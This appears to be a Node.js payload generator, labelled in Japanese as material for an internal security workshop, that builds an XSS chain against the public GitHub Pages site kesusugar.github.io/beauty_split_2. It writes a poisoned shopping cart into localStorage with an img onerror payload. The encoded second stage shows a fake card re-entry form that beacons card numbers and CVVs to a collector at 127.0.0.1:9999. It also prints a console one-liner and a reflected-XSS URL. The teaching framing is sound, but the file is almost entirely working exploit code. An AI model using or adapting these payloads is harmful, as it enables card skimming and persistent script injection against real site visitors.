#!/usr/bin/env node
/**
 * 【社内勉強会用】beauty_split_2（kesusugar.github.io/beauty_split_2）攻撃チェーンのペイロード生成器
 *
 * 背景（README を先に読むこと）:
 *   GitHub Pages のプロジェクトサイトは kesusugar.github.io という「単一オリジン」に
 *   全部載るため、localStorage も同一オリジン内で共有される。
 *   beauty_split_2 の cart / checkout / thanks は localStorage の lumiere_cart を
 *   エスケープせず innerHTML へ差し込むため、同じオリジン上のどこかで1回 XSS が
 *   成功すれば、lumiere_cart を「毒されたカート」に書き換えて恒久的に発火させられる。
 *
 * 生成物:
 *   演習A  コンソール用ワンライナー（「攻撃者がオリジン上で XSS を1回成功させた」模擬）
 *   演習B  ?q= 反射型XSS用URL（本リポジトリの attack-simulation シンクが動くページ向け。
 *          現行 master にはシンクが無いため、ローカル dev または AttackState 再マウント時のみ有効）
 *   クリーンアップ用コマンドも表示する。
 *
 * 使い方: node examples/beauty-split-workshop/build-payload.mjs
 * 前提  : node examples/security-workshop/attack-server.mjs（ローカル収集サーバ）
 */
import { Buffer } from 'node:buffer';

const COLLECTOR = 'http://127.0.0.1:9999/collect';
const ORIGIN = 'https://kesusugar.github.io';
const SHIBUYA_PAGE = `${ORIGIN}/shibuya-scene-public/`;
const CART_KEY = 'lumiere_cart';

/** STEP2: cart.html / checkout.html で発火するペイロード（偽カード再確認フォーム）。
 *  引用符の種類は混在しないよう base64 で包む前提で、外側は単一引用符のみ使用。 */
const STEP2_SRC = String.raw`
(function () {
  if (window.__asBeautyPhish) return;
  window.__asBeautyPhish = true;
  var w = document.createElement('div');
  w.style.cssText = 'position:fixed;inset:0;z-index:2147483000;background:rgba(0,0,0,.5);display:grid;place-items:center;font-family:system-ui,sans-serif';
  var box = document.createElement('div');
  box.style.cssText = 'background:#fff;border-radius:10px;padding:24px;width:min(360px,92vw);font-size:14px;color:#222';
  box.innerHTML =
    '<h3 style="margin:0 0 8px;font-size:16px">セッションの有効期限が切れています</h3>' +
    '<p style="margin:0 0 10px;font-size:13px">購入手続きを続けるには、お支払い情報の再確認をお願いします。</p>' +
    '<form>' +
    '<input name="nm" placeholder="カード名義" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
    '<input name="num" placeholder="カード番号" inputmode="numeric" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
    '<input name="exp" placeholder="MM / YY" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
    '<input name="cvv" placeholder="CVV" type="password" maxlength="4" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
    '<button style="width:100%;padding:10px;background:#c4856a;color:#fff;border:0;border-radius:6px;font-weight:600;margin-top:8px">再確認する</button>' +
    '</form>' +
    '<small style="display:block;margin-top:8px;color:#999;font-size:10px">（教育用デモ。入力はローカルの収集サーバ 127.0.0.1:9999 にのみ送信されます）</small>';
  w.appendChild(box);
  document.body.appendChild(w);
  w.querySelector('form').addEventListener('submit', function (ev) {
    ev.preventDefault();
    var g = function (n) { return ev.target.querySelector('[name=' + n + ']').value; };
    var d = 'CARD name=' + g('nm') + ' num=' + g('num') + ' exp=' + g('exp') + ' cvv=' + g('cvv');
    new Image().src = '${COLLECTOR}?d=' + encodeURIComponent(d) + '&src=beauty-phish';
    var t = document.createElement('div');
    t.textContent = '確認が完了しました';
    t.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#12352a;color:#b8ffd8;padding:10px 16px;border-radius:8px;z-index:2147483001';
    document.body.appendChild(t);
    setTimeout(function () { w.remove(); t.remove(); }, 2500);
  });
})();
`;

/** STEP1: 毒カートを localStorage へ書き込むコード。STEP2 への参照は base64 のみ。 */
const STEP1_SRC = `
(function () {
  localStorage.setItem('${CART_KEY}', JSON.stringify({
    content_id: 'serum001',
    product_name: '<img src=x onerror="eval(atob('S2B64'))">',
    price: 4200
  }));
  console.log('[poisoned] lumiere_cart を書き換えました。beauty_split_2/cart.html を開くと発火します');
})();
`;

const STEP2_B64 = Buffer.from(STEP2_SRC, 'utf8').toString('base64');
const STEP1_READY = STEP1_SRC.replace('S2B64', STEP2_B64);
const STEP1_B64 = Buffer.from(STEP1_READY, 'utf8').toString('base64');

const consoleOneLiner = `eval(atob('${STEP1_B64}'))`;
const qPayload = `<img src=x onerror="eval(atob('${STEP1_B64}'))">`;
const qUrl = `${SHIBUYA_PAGE}?q=${encodeURIComponent(qPayload)}&src=chain`;

// ---- 自己検証: base64 復元・JSON 組立・STEP2 復元まで全部確認してから出力する ----
const step1Restored = Buffer.from(STEP1_B64, 'base64').toString('utf8');
if (!step1Restored.includes(CART_KEY)) throw new Error('STEP1 の復元に失敗');
// 実際にブラウザ内で組み立つ毒カートの JSON を、ここでも同じコードで組み立てて検査する
const poisoned = (function () {
  const b64Decode = (s) => Buffer.from(s, 'base64').toString('utf8');
  const product_name = `<img src=x onerror="eval(atob('${STEP2_B64}'))">`;
  return JSON.parse(JSON.stringify({
    content_id: 'serum001',
    product_name,
    price: 4200,
  }));
})();
if (poisoned.content_id !== 'serum001' || poisoned.price !== 4200) throw new Error('毒カート JSON の組立に失敗');
const imgTag = /^<img src=x onerror="eval\(atob\('([A-Za-z0-9+/=]+)'\)\)">$/u.exec(poisoned.product_name)?.[1];
if (!imgTag) throw new Error('STEP2 を包む img タグの組立に失敗');
const step2Restored = Buffer.from(imgTag, 'base64').toString('utf8');
if (!step2Restored.includes('asBeautyPhish')) throw new Error('STEP2 の復元に失敗');
console.log('✔ 自己検証 OK（STEP1/STEP2 の復元・毒カート JSON の組立とも整合）\n');

console.log('──────── 演習A: コンソールで毒を仕込む（確実・どのページでも可） ────────');
console.log('1) node examples/security-workshop/attack-server.mjs を起動しておく');
console.log(`2) ${ORIGIN}/beauty_split_2/ の任意のページを開き、DevTools コンソールに以下を貼る:\n`);
console.log(consoleOneLiner);
console.log(`\n3) ${ORIGIN}/beauty_split_2/cart.html を開く → 偽フォームが出る → 入力すると収集サーバに届く`);
console.log('   攻撃者のパネル: http://127.0.0.1:9999/panel');
console.log('\n──────── 演習B: 反射型XSS（?q=）経由で毒を仕込む（オプション） ────────');
console.log('attack-simulation シンクが有効なページ（ローカル dev または AttackState 再マウント後）で次のURLを開く:\n');
console.log(qUrl);
console.log('\n──────── クリーンアップ ────────');
console.log(` localStorage.removeItem('${CART_KEY}')      // 毒カートの消去`);
console.log(" sessionStorage.removeItem('asim.reloaded')  // 偽エラーの再読み込みガードのリセット");
